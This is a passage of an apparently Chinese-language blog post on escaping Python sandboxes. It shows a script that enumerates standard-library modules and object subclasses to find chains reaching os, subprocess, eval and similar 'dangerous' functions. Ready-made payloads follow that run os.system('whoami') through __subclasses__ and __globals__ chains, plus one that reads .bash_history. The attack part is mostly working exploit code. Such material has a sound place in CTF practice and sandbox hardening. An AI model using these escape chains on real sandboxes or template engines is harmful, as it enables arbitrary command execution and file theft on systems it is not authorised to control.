class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;codeop&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;collections&#x27;</span>, <span class="string">&#x27;colorsys&#x27;</span>, <span class="string">&#x27;commands&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;compiler&#x27;</span>, <span class="string">&#x27;ConfigParser&#x27;</span>, <span class="string">&#x27;config-x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;contextlib&#x27;</span>, <span class="string">&#x27;cookielib&#x27;</span>, <span class="string">&#x27;Cookie&#x27;</span>, <span class="string">&#x27;copy&#x27;</span>, <span class="string">&#x27;copy_reg&#x27;</span>, <span class="string">&#x27;cProfile&#x27;</span>, <span class="string">&#x27;csv&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;curses&#x27;</span>, <span class="string">&#x27;dbhash&#x27;</span>, <span class="string">&#x27;decimal&#x27;</span>, <span class="string">&#x27;difflib&#x27;</span>, <span class="string">&#x27;dircache&#x27;</span>, <span class="string">&#x27;dis&#x27;</span>, <span class="string">&#x27;dist-packages&#x27;</span>, <span class="string">&#x27;distutils&#x27;</span>, <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;DocXMLRPCServer&#x27;</span>, <span class="string">&#x27;dumbdbm&#x27;</span>, <span class="string">&#x27;dummy_threading&#x27;</span>, <span class="string">&#x27;dummy_thread&#x27;</span>, <span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;encodings&#x27;</span>, <span class="string">&#x27;ensurepip&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;fnmatch&#x27;</span>, <span class="string">&#x27;formatter&#x27;</span>, <span class="string">&#x27;fpformat&#x27;</span>, <span class="string">&#x27;fractions&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;functools&#x27;</span>, <span class="string">&#x27;__future__&#x27;</span>, <span class="string">&#x27;genericpath&#x27;</span>, <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>, <span class="string">&#x27;hashlib&#x27;</span>, <span class="string">&#x27;heapq&#x27;</span>, <span class="string">&#x27;hmac&#x27;</span>, <span class="string">&#x27;hotshot&#x27;</span>, <span class="string">&#x27;htmlentitydefs&#x27;</span>, <span class="string">&#x27;htmllib&#x27;</span>, <span class="string">&#x27;HTMLParser&#x27;</span>, <span class="string">&#x27;httplib&#x27;</span>, <span class="string">&#x27;ihooks&#x27;</span>, <span class="string">&#x27;imaplib&#x27;</span>, <span class="string">&#x27;imghdr&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imputil&#x27;</span>, <span class="string">&#x27;inspect&#x27;</span>, <span class="string">&#x27;io&#x27;</span>, <span class="string">&#x27;json&#x27;</span>, <span class="string">&#x27;keyword&#x27;</span>, <span class="string">&#x27;lib2to3&#x27;</span>, <span class="string">&#x27;lib-dynload&#x27;</span>, <span class="string">&#x27;lib-tk&#x27;</span>, <span class="string">&#x27;LICENSE.txt&#x27;</span>, <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;locale&#x27;</span>, <span class="string">&#x27;logging&#x27;</span>, <span class="string">&#x27;_LWPCookieJar&#x27;</span>, <span class="string">&#x27;macpath&#x27;</span>, <span class="string">&#x27;macurl2path&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;markupbase&#x27;</span>, <span class="string">&#x27;md5&#x27;</span>, <span class="string">&#x27;mhlib&#x27;</span>, <span class="string">&#x27;mimetools&#x27;</span>, <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;MimeWriter&#x27;</span>, <span class="string">&#x27;mimify&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;_MozillaCookieJar&#x27;</span>, <span class="string">&#x27;multifile&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;mutex&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;new&#x27;</span>, <span class="string">&#x27;nntplib&#x27;</span>, <span class="string">&#x27;ntpath&#x27;</span>, <span class="string">&#x27;nturl2path&#x27;</span>, <span class="string">&#x27;numbers&#x27;</span>, <span class="string">&#x27;opcode&#x27;</span>, <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;os2emxpath&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;_osx_support&#x27;</span>, <span class="string">&#x27;pdb.doc&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;__phello__.foo&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;pickletools&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;plat-x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;plistlib&#x27;</span>, <span class="string">&#x27;popen2&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>, <span class="string">&#x27;posixfile&#x27;</span>, <span class="string">&#x27;posixpath&#x27;</span>, <span class="string">&#x27;pprint&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>, <span class="string">&#x27;pydoc_data&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;_pyio&#x27;</span>, <span class="string">&#x27;Queue&#x27;</span>, <span class="string">&#x27;quopri&#x27;</span>, <span class="string">&#x27;random&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>, <span class="string">&#x27;re&#x27;</span>, <span class="string">&#x27;rexec&#x27;</span>, <span class="string">&#x27;rfc822&#x27;</span>, <span class="string">&#x27;rlcompleter&#x27;</span>, <span class="string">&#x27;robotparser&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;sched&#x27;</span>, <span class="string">&#x27;sets&#x27;</span>, <span class="string">&#x27;sgmllib&#x27;</span>, <span class="string">&#x27;sha&#x27;</span>, <span class="string">&#x27;shelve&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;SimpleHTTPServer&#x27;</span>, <span class="string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="string">&#x27;sitecustomize&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;smtplib&#x27;</span>, <span class="string">&#x27;sndhdr&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;SocketServer&#x27;</span>, <span class="string">&#x27;sqlite3&#x27;</span>, <span class="string">&#x27;sre_compile&#x27;</span>, <span class="string">&#x27;sre_constants&#x27;</span>, <span class="string">&#x27;sre_parse&#x27;</span>, <span class="string">&#x27;sre&#x27;</span>, <span class="string">&#x27;ssl&#x27;</span>, <span class="string">&#x27;stat&#x27;</span>, <span class="string">&#x27;statvfs&#x27;</span>, <span class="string">&#x27;StringIO&#x27;</span>, <span class="string">&#x27;stringold&#x27;</span>, <span class="string">&#x27;stringprep&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;_strptime&#x27;</span>, <span class="string">&#x27;struct&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sunaudio&#x27;</span>, <span class="string">&#x27;sunau&#x27;</span>, <span class="string">&#x27;symbol&#x27;</span>, <span class="string">&#x27;symtable&#x27;</span>, <span class="string">&#x27;_sysconfigdata&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>, <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;textwrap&#x27;</span>, <span class="string">&#x27;_threading_local&#x27;</span>, <span class="string">&#x27;threading&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;toaiff&#x27;</span>, <span class="string">&#x27;tokenize&#x27;</span>, <span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;traceback&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;tty&#x27;</span>, <span class="string">&#x27;types&#x27;</span>, <span class="string">&#x27;unittest&#x27;</span>, <span class="string">&#x27;urllib2&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;urlparse&#x27;</span>, <span class="string">&#x27;UserDict&#x27;</span>, <span class="string">&#x27;UserList&#x27;</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;UserString&#x27;</span>, <span class="string">&#x27;uuid&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;warnings&#x27;</span>, <span class="string">&#x27;wave&#x27;</span>, <span class="string">&#x27;weakref&#x27;</span>, <span class="string">&#x27;_weakrefset&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;whichdb&#x27;</span>, <span class="string">&#x27;wsgiref&#x27;</span>, <span class="string">&#x27;wsgiref.egg-info&#x27;</span>, <span class="string">&#x27;xdrlib&#x27;</span>, <span class="string">&#x27;xml&#x27;</span>, <span class="string">&#x27;xmllib&#x27;</span>, <span class="string">&#x27;xmlrpclib&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python3标准库模块</span></span><br><span class="line">modules3 = [<span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;aifc&#x27;</span>, <span class="string">&#x27;argparse&#x27;</span>, <span class="string">&#x27;ast&#x27;</span>, <span class="string">&#x27;asynchat&#x27;</span>, <span class="string">&#x27;asyncio&#x27;</span>, <span class="string">&#x27;asyncore&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;binhex&#x27;</span>, <span class="string">&#x27;bisect&#x27;</span>, <span class="string">&#x27;_bootlocale&#x27;</span>, <span class="string">&#x27;bz2&#x27;</span>, <span class="string">&#x27;calendar&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;chunk&#x27;</span>, <span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;codeop&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;collections&#x27;</span>, <span class="string">&#x27;_collections_abc&#x27;</span>, <span class="string">&#x27;colorsys&#x27;</span>, <span class="string">&#x27;_compat_pickle&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;_compression&#x27;</span>, <span class="string">&#x27;concurrent&#x27;</span>, <span class="string">&#x27;config-3.8-x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;configparser&#x27;</span>, <span class="string">&#x27;contextlib&#x27;</span>, <span class="string">&#x27;contextvars&#x27;</span>, <span class="string">&#x27;copy&#x27;</span>, <span class="string">&#x27;copyreg&#x27;</span>, <span class="string">&#x27;cProfile&#x27;</span>, <span class="string">&#x27;crypt&#x27;</span>, <span class="string">&#x27;csv&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;curses&#x27;</span>, <span class="string">&#x27;dataclasses&#x27;</span>, <span class="string">&#x27;datetime&#x27;</span>, <span class="string">&#x27;dbm&#x27;</span>, <span class="string">&#x27;decimal&#x27;</span>, <span class="string">&#x27;difflib&#x27;</span>, <span class="string">&#x27;dis&#x27;</span>, <span class="string">&#x27;dist-packages&#x27;</span>, <span class="string">&#x27;distutils&#x27;</span>, <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;dummy_threading&#x27;</span>, <span class="string">&#x27;_dummy_thread&#x27;</span>, <span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;encodings&#x27;</span>, <span class="string">&#x27;ensurepip&#x27;</span>, <span class="string">&#x27;enum&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;fnmatch&#x27;</span>, <span class="string">&#x27;formatter&#x27;</span>, <span class="string">&#x27;fractions&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;functools&#x27;</span>, <span class="string">&#x27;__future__&#x27;</span>, <span class="string">&#x27;genericpath&#x27;</span>, <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>, <span class="string">&#x27;hashlib&#x27;</span>, <span class="string">&#x27;heapq&#x27;</span>, <span class="string">&#x27;hmac&#x27;</span>, <span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;imaplib&#x27;</span>, <span class="string">&#x27;imghdr&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imp&#x27;</span>, <span class="string">&#x27;inspect&#x27;</span>, <span class="string">&#x27;io&#x27;</span>, <span class="string">&#x27;ipaddress&#x27;</span>, <span class="string">&#x27;json&#x27;</span>, <span class="string">&#x27;keyword&#x27;</span>, <span class="string">&#x27;lib2to3&#x27;</span>, <span class="string">&#x27;lib-dynload&#x27;</span>, <span class="string">&#x27;LICENSE.txt&#x27;</span>, <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;locale&#x27;</span>, <span class="string">&#x27;logging&#x27;</span>, <span class="string">&#x27;lzma&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;_markupbase&#x27;</span>, <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;nntplib&#x27;</span>, <span class="string">&#x27;ntpath&#x27;</span>, <span class="string">&#x27;nturl2path&#x27;</span>, <span class="string">&#x27;numbers&#x27;</span>, <span class="string">&#x27;opcode&#x27;</span>, <span class="string">&#x27;operator&#x27;</span>, <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;_osx_support&#x27;</span>, <span class="string">&#x27;pathlib&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;__phello__.foo&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;pickletools&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;plistlib&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>, <span class="string">&#x27;posixpath&#x27;</span>, <span class="string">&#x27;pprint&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;_py_abc&#x27;</span>, <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>, <span class="string">&#x27;_pydecimal&#x27;</span>, <span class="string">&#x27;pydoc_data&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;_pyio&#x27;</span>, <span class="string">&#x27;queue&#x27;</span>, <span class="string">&#x27;quopri&#x27;</span>, <span class="string">&#x27;random&#x27;</span>, <span class="string">&#x27;reprlib&#x27;</span>, <span class="string">&#x27;re&#x27;</span>, <span class="string">&#x27;rlcompleter&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;sched&#x27;</span>, <span class="string">&#x27;secrets&#x27;</span>, <span class="string">&#x27;selectors&#x27;</span>, <span class="string">&#x27;shelve&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;signal&#x27;</span>, <span class="string">&#x27;_sitebuiltins&#x27;</span>, <span class="string">&#x27;sitecustomize&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;smtplib&#x27;</span>, <span class="string">&#x27;sndhdr&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;socketserver&#x27;</span>, <span class="string">&#x27;sqlite3&#x27;</span>, <span class="string">&#x27;sre_compile&#x27;</span>, <span class="string">&#x27;sre_constants&#x27;</span>, <span class="string">&#x27;sre_parse&#x27;</span>, <span class="string">&#x27;ssl&#x27;</span>, <span class="string">&#x27;statistics&#x27;</span>, <span class="string">&#x27;stat&#x27;</span>, <span class="string">&#x27;stringprep&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;_strptime&#x27;</span>, <span class="string">&#x27;struct&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sunau&#x27;</span>, <span class="string">&#x27;symbol&#x27;</span>, <span class="string">&#x27;symtable&#x27;</span>, <span class="string">&#x27;_sysconfigdata__linux_x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;_sysconfigdata__x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>, <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;textwrap&#x27;</span>, <span class="string">&#x27;_threading_local&#x27;</span>, <span class="string">&#x27;threading&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;tkinter&#x27;</span>, <span class="string">&#x27;tokenize&#x27;</span>, <span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;traceback&#x27;</span>, <span class="string">&#x27;tracemalloc&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;tty&#x27;</span>, <span class="string">&#x27;turtle&#x27;</span>, <span class="string">&#x27;types&#x27;</span>, <span class="string">&#x27;typing&#x27;</span>, <span class="string">&#x27;unittest&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;uuid&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;venv&#x27;</span>, <span class="string">&#x27;warnings&#x27;</span>, <span class="string">&#x27;wave&#x27;</span>, <span class="string">&#x27;weakref&#x27;</span>, <span class="string">&#x27;_weakrefset&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;wsgiref&#x27;</span>, <span class="string">&#x27;xdrlib&#x27;</span>, <span class="string">&#x27;xml&#x27;</span>, <span class="string">&#x27;xmlrpc&#x27;</span>, <span class="string">&#x27;zipapp&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>, <span class="string">&#x27;zipimport&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 危险模块</span></span><br><span class="line">methods = [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;commands&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;import_module&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;spawn&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;types&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基本类型</span></span><br><span class="line">types = [<span class="string">&#x27;&#x27;</span>, [], (), &#123;&#125;]</span><br><span class="line"></span><br><span class="line"><span class="comment"># object的派生类</span></span><br><span class="line">subclasses = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 危险标准库模块</span></span><br><span class="line">risk_modules = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历派生类并获取模块</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(object.__subclasses__())):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        subclasses[i] = object.__subclasses__()[i].__init__.__globals__.keys()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(e)</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;------------------------------ 思路二 ------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入了危险模块的派生类</span></span><br><span class="line"><span class="keyword">for</span> i, submodules <span class="keyword">in</span> subclasses.items():</span><br><span class="line">    <span class="keyword">for</span> submodule <span class="keyword">in</span> submodules:</span><br><span class="line">        <span class="keyword">for</span> method <span class="keyword">in</span> methods:</span><br><span class="line">            <span class="keyword">if</span> method == submodule:</span><br><span class="line">                <span class="comment"># print(f&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;method&#125;&#x27;]&quot;)</span></span><br><span class="line">                print(<span class="string">&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;method&#125;&#x27;]&quot;</span>.format(i=i, method=method))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;------------------------------ 缓冲区 ------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断Python版本</span></span><br><span class="line"><span class="keyword">if</span> (sys.version_info[<span class="number">0</span>]) == <span class="number">3</span>:</span><br><span class="line">    modules = modules3</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    modules = modules2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入了危险模块的标准库</span></span><br><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> modules:</span><br><span class="line">    risk_modules[module] = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        m = __import__(module)  <span class="comment"># 导入模块</span></span><br><span class="line">        attrs = dir(m)          <span class="comment"># 获取属性与方法</span></span><br><span class="line">        <span class="keyword">for</span> method <span class="keyword">in</span> methods:</span><br><span class="line">            <span class="keyword">if</span> method <span class="keyword">in</span> attrs: <span class="comment"># 若存在危险模块</span></span><br><span class="line">                risk_modules[module].append(method)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(e)</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;------------------------------ 思路三 ------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入了危险标准库的派生类</span></span><br><span class="line"><span class="keyword">for</span> i, submodules <span class="keyword">in</span> subclasses.items():</span><br><span class="line">    <span class="keyword">for</span> submodule <span class="keyword">in</span> submodules:</span><br><span class="line">        <span class="keyword">for</span> risk_module <span class="keyword">in</span> risk_modules.keys():</span><br><span class="line">            <span class="keyword">if</span> risk_module == submodule:</span><br><span class="line">                <span class="keyword">for</span> method <span class="keyword">in</span> risk_modules[risk_module]:</span><br><span class="line">                    <span class="comment"># print(f&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;risk_module&#125;&#x27;].__dict__[&#x27;&#123;method&#125;&#x27;]&quot;)</span></span><br><span class="line">                    print(<span class="string">&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;risk_module&#125;&#x27;].__dict__[&#x27;&#123;method&#125;&#x27;]&quot;</span>.format(i=i, risk_module=risk_module, method=method))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;------------------------------ 思路四 ------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基本类型的特殊方法</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> types:</span><br><span class="line">    <span class="keyword">for</span> method <span class="keyword">in</span> dir(t):</span><br><span class="line">        <span class="comment"># 待比较类型</span></span><br><span class="line">        c = str(t.__getattribute__(method).__class__)</span><br><span class="line">        <span class="comment"># Python2特殊类型</span></span><br><span class="line">        c2 = <span class="string">&quot;&lt;type &#x27;builtin_function_or_method&#x27;&gt;&quot;</span></span><br><span class="line">        <span class="comment"># Python3特殊类型</span></span><br><span class="line">        c3 = <span class="string">&quot;&lt;class &#x27;builtin_function_or_method&#x27;&gt;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> c == c2 <span class="keyword">or</span> c == c3:</span><br><span class="line">            <span class="comment"># 转义双引号</span></span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                t = <span class="string">&quot;&#x27;&#x27;&quot;</span></span><br><span class="line">            print(<span class="string">&quot;&#123;t&#125;.&#123;method&#125;.__class__.__call__&quot;</span>.format(t=t, method=method))</span><br></pre></td></tr></table></figure><h4 id="思路一实例"><a href="#思路一实例" class="headerlink" title="思路一实例"></a>思路一实例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python3</span></span><br><span class="line">object.__subclasses__()[<span class="number">37</span>].__call__(eval, <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2 </span></span><br><span class="line">object.__subclasses__()[<span class="number">29</span>].__call__(eval, <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line">object.__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h4 id="思路二实例"><a href="#思路二实例" class="headerlink" title="思路二实例"></a>思路二实例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python3</span></span><br><span class="line">object.__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">object.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line">object.__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">object.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="思路三实例"><a href="#思路三实例" class="headerlink" title="思路三实例"></a>思路三实例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python3</span></span><br><span class="line">object.__subclasses__()[<span class="number">170</span>].__init__.__globals__[<span class="string">&#x27;_collections_abc&#x27;</span>].__dict__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">object.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="思路三特例"><a href="#思路三特例" class="headerlink" title="思路三特例"></a>思路三特例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 